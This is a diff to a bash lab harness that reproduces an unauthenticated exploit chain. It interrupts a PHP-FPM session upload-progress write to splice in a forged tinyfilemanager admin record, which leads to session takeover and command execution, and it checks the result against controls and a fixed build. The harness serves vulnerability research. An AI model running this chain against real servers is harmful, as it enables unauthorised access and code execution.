@@ -32,6 +32,10 @@
 #   <tfm-web>:     lab/src/php2shell-r5-app/tfm-app/web (provision-tfm-app.sh)
 
 set -u
+DEATH_MODE=${DEATH_MODE:-shim}
+[ "$DEATH_MODE" = shim ] || [ "$DEATH_MODE" = rlimit ] || { echo "DEATH_MODE must be shim or rlimit"; exit 2; }
+NATIVE_ATTACK=0
+if [ -z "${DISPLAY_ERRORS+x}" ]; then DISPLAY_ERRORS=1; [ "$DEATH_MODE" = rlimit ] && DISPLAY_ERRORS=0; fi
 FPM=$(readlink -f "$1")
 WEB=$(readlink -f "$2")
 OUT=${3:-lab/build/evidence}
@@ -93,7 +97,7 @@ pm.max_requests = 0
 catch_workers_output = yes
 clear_env = no
 php_admin_value[html_errors] = 0
-php_admin_value[display_errors] = 1
+php_admin_value[display_errors] = $DISPLAY_ERRORS
 php_admin_value[error_reporting] = 32767
 php_admin_value[post_max_size] = 1G
 php_admin_value[max_file_uploads] = 20
@@ -129,14 +133,15 @@ d=open(sys.argv[1],"rb").read(); i=d.find(sys.argv[2].encode())
 sys.stdout.buffer.write(d[i:] if i>=0 else b"")' "$1" "$2"
 }
 esc_fn() { printf %s "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
-mpbody() { # $1 = progress key, $2 = raw filename
+mpbody() { # $1 = progress key, $2 = raw filename, $3 = upload bytes
     printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n%s\r\n" "$BOUNDARY" "$SID"
     printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n%s\r\n" "$BOUNDARY" "$1"
-    printf -- "--%s\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"%s\"\r\n\r\n1\r\n" "$BOUNDARY" "$(esc_fn "$2")"
-    printf -- "--%s--\r\n" "$BOUNDARY"
+    printf -- "--%s\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"%s\"\r\n\r\n" "$BOUNDARY" "$(esc_fn "$2")"
+    head -c "$3" /dev/zero | tr '\0' 'U'
+    printf "\r\n--%s--\r\n" "$BOUNDARY"
 }
 post() { # $1 = progress key, $2 = raw filename -> a REAL tinyfilemanager request (no cookie)
-    mpbody "$1" "$2" > "$D/body"
+    mpbody "$1" "$2" "${POST_BYTES:-8192}" > "$D/body"
     fcgi "$WEB/index.php" --body "$D/body" \
         --param "QUERY_STRING=p=" --param "REQUEST_URI=/index.php?p=" \
         --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST \
@@ -188,6 +193,11 @@ sys.exit(1)
 PY
 }
 child_pids() { pgrep -P "$MPID" 2>/dev/null || true; }
+worker_cpu_ticks() {
+    python3 -c 'import sys
+s=open(f"/proc/{sys.argv[1]}/stat").read(); f=s[s.rfind(")")+2:].split()
+print(int(f[11])+int(f[12]))' "$1"
+}
 wait_child() {
     local i c
     for i in $(seq 1 100); do
@@ -202,8 +212,12 @@ start_fpm() {
     fuser -k "$PORT"/tcp >/dev/null 2>&1 || true
     sleep 0.2
     (
-        export LD_PRELOAD="$SO" \
-               AFTERSHELL_LOG_FILE="$DUMP" AFTERSHELL_LOG_ONLY=1
+        if [ "$NATIVE_ATTACK" = 0 ]; then
+            export LD_PRELOAD="$SO" \
+                   AFTERSHELL_LOG_FILE="$DUMP" AFTERSHELL_LOG_ONLY=1
+        else
+            unset LD_PRELOAD AFTERSHELL_LOG_FILE AFTERSHELL_LOG_ONLY
+        fi
         if [ -n "$KA2" ]; then
             export AFTERSHELL_KILL_AT="$KA2" AFTERSHELL_KILL_ARM="$ARM"
         fi
@@ -239,7 +253,7 @@ echo "== FPM phase-1 master pid=$MPID label=$LABEL build=$BUILDDIR child=$CHILD 
 
 build_carrier 100
 rm -f "$DUMP"
-post carr "$X700" >> "$LOG" 2>&1
+POST_BYTES=${ATTACK_BYTES:-8192} post carr "$X700" >> "$LOG" 2>&1
 K=$(python3 -c 'import sys
 d=open(sys.argv[1],"rb").read()
 i=d.find(b"=== pwrite"); j=d.find(b"\n", i) + 1
@@ -288,19 +302,35 @@ echo "sanity consumer: pwrite-dump entries=$SAN_PID (session write by the app)" 
 
 stop_fpm
 
-# ================================= phase 2: armed kill + respawn + consumer
-KA2="$K"
+# ================================= phase 2: interrupted write + respawn + consumer
+if [ "$DEATH_MODE" = rlimit ]; then
+    NATIVE_ATTACK=1
+    KA2=""
+else
+    KA2="$K"
+fi
 start_fpm
 OLDCHILD=$CHILD
-echo "== FPM phase-2 master pid=$MPID KILL_AT=$K ARM=$ARM child=$OLDCHILD (armed)" >> "$LOG"
-
-touch "$ARM"
-post carr "$X700" >> "$LOG" 2>&1
+echo "== FPM phase-2 master pid=$MPID mode=$DEATH_MODE boundary=$K child=$OLDCHILD" >> "$LOG"
+if [ "$DEATH_MODE" = rlimit ]; then
+    prlimit --pid "$OLDCHILD" --fsize="$K:$K" >> "$LOG" 2>&1 || {
+        echo "failed to set worker RLIMIT_FSIZE" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
+    prlimit --pid "$OLDCHILD" --fsize >> "$LOG" 2>&1
+    if [ -n "${CPU_LIMIT:-}" ]; then
+        prlimit --pid "$OLDCHILD" --cpu="$CPU_LIMIT:$CPU_LIMIT" >> "$LOG" 2>&1 || {
+            echo "failed to set worker RLIMIT_CPU" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
+        prlimit --pid "$OLDCHILD" --cpu >> "$LOG" 2>&1
+    fi
+else
+    touch "$ARM"
+fi
+POST_BYTES=${ATTACK_BYTES:-8192} post carr "$X700" >> "$LOG" 2>&1
 RC=$?
 rm -f "$ARM"
 echo "kill-run rc=$RC (2 = FASTCGI_ERROR: worker died mid-request, expected)" >> "$LOG"
 FILESZ=$(wc -c < "$SESS/sess_$SID")
 echo "file-after-kill: $FILESZ bytes" >> "$LOG"
+ls -l "$SESS" >> "$LOG" 2>&1
 echo "  bytes-K-onward: $(seg_after "$SESS/sess_$SID" 'filemanager|a:1:' | head -c 60)" >> "$LOG"
 
 NEWCHILD=$(wait_child) || { echo "master did NOT respawn a worker — inspect $LOG" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
@@ -327,15 +357,20 @@ rm -f "$DUMP"
 consumer A > "$D/consumerA.out" 2>&1
 cat "$D/consumerA.out" >> "$LOG"
 PROMOTED=0
-python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && PROMOTED=1
+if [ "$NATIVE_ATTACK" = 0 ]; then
+    python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && PROMOTED=1
 import sys
 d = open(sys.argv[1], 'rb').read()
 ok = b'}filemanager|a:1:{s:6:"logged";s:5:"admin";}' in d   # record-boundary promotion, not inert string content
 print(f"consumer-write-dump: promoted-evil-record:{ok} ({len(d)} bytes dumped)")
 sys.exit(0 if ok else 1)
 EOF
-[ "$PROMOTED" = 1 ] && echo "   tfm consumer session WRITE re-encoded the promoted admin record" | tee -a "$LOG" \
-                   || echo "   consumer write dump has NO evil record (see $LOG)" | tee -a "$LOG"
+    [ "$PROMOTED" = 1 ] && echo "   tfm consumer session WRITE re-encoded the promoted admin record" | tee -a "$LOG" \
+                       || echo "   consumer write dump has NO evil record (see $LOG)" | tee -a "$LOG"
+else
+    PROMOTED=2
+    echo "   native attack: no LD_PRELOAD; session promotion is assessed by the app response below" >> "$LOG"
+fi
 
 TAKEOVER=0
 TOKEN=$(python3 -c 'import re,sys
@@ -379,7 +414,7 @@ echo "marker-file-present: $([ -n "$MARKER_CONTENT" ] && echo yes || echo no)" |
 
 # ---- control: identical carrier + replacement WITHOUT the kill
 build_carrier "$PADLEN"
-post carr "$X700" >> "$LOG" 2>&1
+POST_BYTES=${ATTACK_BYTES:-8192} post carr "$X700" >> "$LOG" 2>&1
 echo "control-write rc=$?" >> "$LOG"
 # ---- fixed-build app-health lane: PHP 8.4.28 adds the
 # SESSION_CHECK_UPLOAD_PROGRESS_STATE guard (session.c:94-100) — runtime
@@ -404,15 +439,17 @@ rm -f "$DUMP"
 consumer CTL > "$D/consumerCTL.out" 2>&1
 cat "$D/consumerCTL.out" >> "$LOG"
 CTL_PROMOTED=0
-python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && CTL_PROMOTED=1
+if [ "$NATIVE_ATTACK" = 0 ]; then
+    python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && CTL_PROMOTED=1
 import sys
 d = open(sys.argv[1], 'rb').read()
 ok = b'}filemanager|a:1:{s:6:"logged";s:5:"admin";}' in d
 print(f"control-write-dump: has-evil-record:{ok}")
 sys.exit(0 if ok else 1)
 EOF
-[ "$CTL_PROMOTED" = 1 ] && echo "   CONTROL UNEXPECTED: evil record without kill — harness invalid" | tee -a "$LOG" \
-                       || echo "   control (no kill): no evil record in the app session write, as expected" | tee -a "$LOG"
+    [ "$CTL_PROMOTED" = 1 ] && echo "   CONTROL UNEXPECTED: evil record without kill — harness invalid" | tee -a "$LOG" \
+                           || echo "   control (no kill): no evil record in the app session write, as expected" | tee -a "$LOG"
+fi
 CTL_TAKEOVER=0
 grep -q 'name="fm_usr"' "$D/consumerCTL.out" || CTL_TAKEOVER=1
 [ "$CTL_TAKEOVER" = 1 ] && echo "   CONTROL UNEXPECTED: logged-in page without the kill — inspect $LOG" | tee -a "$LOG" \
@@ -435,12 +472,19 @@ fi
 echo "== verdict scan (log: $LOG)" | tee -a "$LOG"
 [ "$MIXOK" = 1 ] && echo "   splice on disk before the consumer (k1new || C[K:])" | tee -a "$LOG" \
                   || echo "   post-kill file NOT the splice (8.4.28: expected)" | tee -a "$LOG"
-[ "$PROMOTED" = 1 ] && echo "   UNAUTH PRODUCER -> REAL-APP CONSUMER: promoted admin record observed in the app session write" | tee -a "$LOG" \
-                    || echo "   no promotion through the app (see $LOG)" | tee -a "$LOG"
+if [ "$PROMOTED" = 2 ]; then
+    echo "   native producer/consumer: no preload; promotion judged by tinyfilemanager authentication" | tee -a "$LOG"
+else
+    [ "$PROMOTED" = 1 ] && echo "   UNAUTH PRODUCER -> REAL-APP CONSUMER: promoted admin record observed in the app session write" | tee -a "$LOG" \
+                        || echo "   no promotion through the app (see $LOG)" | tee -a "$LOG"
+fi
 [ "$TAKEOVER" = 1 ] && echo "   UNAUTH SESSION TAKEOVER of tinyfilemanager admin through the splice" | tee -a "$LOG" \
                     || echo "   no takeover (8.4.28/no-kill: expected)" | tee -a "$LOG"
-[ "$EXECOK" = 1 ] && echo "   UNAUTH -> DESIGNED-ADMIN UPLOAD -> LIVE-WORKER COMMAND EXECUTION (marker $MTAG, shim kill = rung-4 mechanics)" | tee -a "$LOG" \
-                   || echo "   no command execution (8.4.28/no-kill: expected)" | tee -a "$LOG"
+if [ "$EXECOK" = 1 ]; then
+    echo "   UNAUTH -> $DEATH_MODE WRITE INTERRUPTION -> ADMIN UPLOAD -> LIVE-WORKER COMMAND EXECUTION (marker $MTAG)" | tee -a "$LOG"
+else
+    echo "   no command execution (8.4.28/no-kill: expected)" | tee -a "$LOG"
+fi
 grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY' "$LOG" && \
     echo "   SANITIZER/ASSERT OUTPUT PRESENT — inspect $LOG" | tee -a "$LOG"
 if [ -f "$D/fpm-error.log" ]; then
